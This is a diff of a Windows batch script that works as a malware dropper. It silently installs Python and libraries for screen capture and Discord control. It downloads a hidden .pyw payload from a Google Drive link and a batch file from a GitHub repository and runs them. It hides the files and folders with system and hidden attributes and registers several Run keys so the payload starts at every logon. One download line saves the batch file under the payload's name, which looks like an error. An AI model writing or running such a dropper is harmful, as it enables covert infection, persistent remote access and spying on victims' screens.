@@ -1,5 +1,15 @@
 @echo off
-goto conf
+
+where pythonw
+if "%errorlevel%" == "0" (
+	pip install discord.py pyautogui opencv-python numpy pillow requests
+	goto conf
+) else (
+	curl -o python-installer.exe https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe &&
+	python-installer.exe /quiet InstallAllUsers=0 PrependPath=1 &&
+	del python-installer.exe
+	goto :end
+)
 
 :conf
 IF EXIST "C:\Users\%USERNAME%\configuration\" (
@@ -10,13 +20,13 @@ IF EXIST "C:\Users\%USERNAME%\configuration\" (
 )
 
 :hote
-IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.exe" (
+IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyw" (
+	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
 	goto rewind_1
 ) ELSE (
-	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.exe" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/wxappx.exe"
-	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WXAppX /t REG_SZ /d "C:\Users\%USERNAME%\configuration\wxappx.exe" /f
-	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.exe"
-	start "" "C:\Users\%USERNAME%\configuration\wxappx.exe"
+	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://drive.usercontent.google.com/download?id=1A567sVc0J6MSjmZb27MkkC_Z3yyZOHxa&export=download&authuser=0&confirm=t&uuid=bd946f0e-ff99-4ffd-aae8-4277f88dadf7&at=AIrpjvNLmGE8gGEaoYYwOdJ1LR19:1736510702532"
+	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.pyw"
+	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
 	goto rewind_1
 )
 
@@ -24,7 +34,7 @@ IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.exe" (
 IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
 	goto rewind_2
 ) ELSE (
-	curl
+	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.bat"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RewindConfig /t REG_SZ /d "C:\Users\%USERNAME%\configuration\rewind.bat" /f
 	attrib +s +h "C:\Users\%USERNAME%\configuration\rewind.bat"
 	goto rewind_2
@@ -33,10 +43,14 @@ IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
 :rewind_2
 IF EXIST "C:\Users\%USERNAME%\rewind.bat" (
 	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
+	goto end
 ) ELSE (
 	COPY "C:\Users\%USERNAME%\configuration\rewind.bat" "C:\Users\%USERNAME%\"
 	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
 	attrib +s +h "C:\Users\%USERNAME%\rewind.bat"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Rewind /t REG_SZ /d "C:\Users\%USERNAME%\rewind.bat" /f
+	goto end
 )
+
+:end
 exit /B 0
